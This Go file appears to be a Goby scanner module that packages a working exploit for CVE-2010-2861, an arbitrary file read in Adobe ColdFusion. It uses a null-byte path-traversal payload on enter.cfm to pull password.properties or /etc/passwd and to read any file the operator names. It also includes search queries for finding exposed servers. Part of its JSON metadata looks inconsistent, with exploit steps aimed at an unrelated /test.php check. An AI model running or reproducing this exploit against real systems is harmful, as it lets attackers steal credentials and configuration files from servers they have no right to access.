package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Adobe ColdFusion enter.cfm locale file arbitrary file read vulnerability (CVE-2010-2861)",
    "Description": "<p>Adobe ColdFusion is a dynamic web server product of Adobe (Adobe), and it runs CFML (ColdFusion Markup Language), which is a programming language for web applications.</p><p>In Adobe ColdFusion 9, 9.0.1, 9.0.2 and other versions, the /CFIDE/administrator/enter.cfm path has a security vulnerability, allowing remote attackers to read arbitrary files.</p>",
    "Product": "Adobe-ColdFusion",
    "Homepage": "https://www.adobe.com/",
    "DisclosureDate": "2013-05-09",
    "PostTime": "2023-08-16",
    "Author": "ldx",
    "FofaQuery": "(body=\"/cfajax/\" || header=\"CFTOKEN\" || banner=\"CFTOKEN\" || body=\"ColdFusion.Ajax\" || body=\"<cfscript>\") && body!=\"wordpress\" && body!=\"wp-includes\" && header!=\"WordPress\" && header!=\"wordpress_test_cookie\" && header!=\"wp-json\" || server=\"ColdFusion\" || title=\"ColdFusion\" || (body=\"crossdomain.xml\" && body=\"CFIDE\") || (body=\"#000808\" && body=\"#e7e7e7\")",
    "GobyQuery": "(body=\"/cfajax/\" || header=\"CFTOKEN\" || banner=\"CFTOKEN\" || body=\"ColdFusion.Ajax\" || body=\"<cfscript>\") && body!=\"wordpress\" && body!=\"wp-includes\" && header!=\"WordPress\" && header!=\"wordpress_test_cookie\" && header!=\"wp-json\" || server=\"ColdFusion\" || title=\"ColdFusion\" || (body=\"crossdomain.xml\" && body=\"CFIDE\") || (body=\"#000808\" && body=\"#e7e7e7\")",
    "Level": "2",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"http://www.example.com\">https://www.adobe.com/support/security/advisories/apsa13-03.html</a></p>",
    "References": [
        "https://www.adobe.com/support/security/advisories/apsa13-03.html"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filename",
            "type": "input",
            "value": "../../../../../../../../etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "header": {},
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "rdspassword=",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "encrypted=true</title>",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2010-2861"
    ],
    "CNNVD": [
        "CNNVD-201008-134"
    ],
    "CNVD": [
        "CNVD-2010-1562"
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Adobe ColdFusion enter.cfm locale 文件任意文件读取漏洞（CVE-2010-2861）",
            "Product": "Adobe-ColdFusion",
            "Description": "<p>Adobe ColdFusion 是美国奥多比（Adobe）公司的一款动态 Web 服务器产品。<br></p><p>Adobe ColdFusion 9，9.0.1，9.0.2 等版本中，/CFIDE/administrator/enter.cfm 路径存在安全漏洞，允许远程攻击者读取任意文件。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://www.example.com\" target=\"_blank\">https://www.adobe.com/support/security/advisories/apsa13-03.html</a></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Adobe ColdFusion enter.cfm locale file arbitrary file read vulnerability (CVE-2010-2861)",
            "Product": "Adobe-ColdFusion",
            "Description": "<p>Adobe ColdFusion is a dynamic web server product of Adobe (Adobe), and it runs CFML (ColdFusion Markup Language), which is a programming language for web applications.</p><p>In Adobe ColdFusion 9, 9.0.1, 9.0.2 and other versions, the /CFIDE/administrator/enter.cfm path has a security vulnerability, allowing remote attackers to read arbitrary files.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:&nbsp;<a href=\"http://www.example.com\" target=\"_blank\">https://www.adobe.com/support/security/advisories/apsa13-03.html</a></p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10830"
}`

	sendPayload93a4c7d5 := func(hostInfo *httpclient.FixUrl, filename string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewGetRequestConfig("/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../" + filename + "%00en")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rsp, err := sendPayload93a4c7d5(u, "/ColdFusion8/lib/password.properties")
			if err != nil {
				return false
			}
			if !strings.Contains(rsp.Title, "rdspassword=") || !strings.Contains(rsp.Title, "encrypted=") {
				rsp, err = sendPayload93a4c7d5(u, "/etc/passwd")
				if err != nil {
					return false
				}
				return strings.Contains(rsp.Title, "root:x:0:0")
			}
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filename := goutils.B2S(ss.Params["filename"])
			rsp, err := sendPayload93a4c7d5(expResult.HostInfo, filename)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
			} else {
				if rsp.Title == "ColdFusion Administrator Login" {
					expResult.Success = false
					expResult.Output = "目标文件或文件夹不存在"
				} else {
					expResult.Success = true
					expResult.Output = rsp.Title
				}
			}
			return expResult
		},
	))
}